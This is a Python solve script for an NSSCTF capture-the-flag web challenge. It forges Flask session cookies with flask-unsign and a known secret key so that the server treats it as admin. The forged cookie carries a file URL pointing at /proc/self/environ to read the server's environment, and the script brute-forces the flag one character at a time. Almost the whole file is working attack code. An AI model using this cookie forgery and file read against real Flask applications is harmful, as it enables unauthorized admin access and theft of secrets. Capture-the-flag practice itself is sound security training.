import subprocess
import shlex
import requests
import time

flag = 'NSSCTF{'
url = "http://node4.anna.nssctf.cn:22832/getflag"
string = "}-0123456789-}abcdefghijkl-}mnopqrstuvwxyz-}"

def getjwt(command):
    command_list = shlex.split(command)
    result = subprocess.run(command_list, stdout=subprocess.PIPE)
    output = result.stdout.decode('utf-8').strip("\r\n")
    return output

while '}' not in flag:
    for i in string:
        command = '''flask-unsign --sign --cookie "{'admin': True, 'data': b'payload', 'url': 'File:///proc/self/environ'}" --secret "5554eb05-0fdc-466f-a3f9-5bd2ba61f638"'''
        payload = flag + i
        command = command.replace("payload", payload)
        cookie = getjwt(command)
        cookies = {
            "session": str(cookie)
        }
        re = requests.get(url=url,cookies=cookies)
        
        while(re.status_code == 500 or re.status_code == 502):
                time.sleep(2)
        re = requests.get(url=url,cookies=cookies)
						
        print("try: "+payload)
        print("code: "+str(re.status_code))
        print("response: "+re.text)
        if 'get' in re.text:
            flag += i
            print("flag: "+flag)
            break
        time.sleep(3)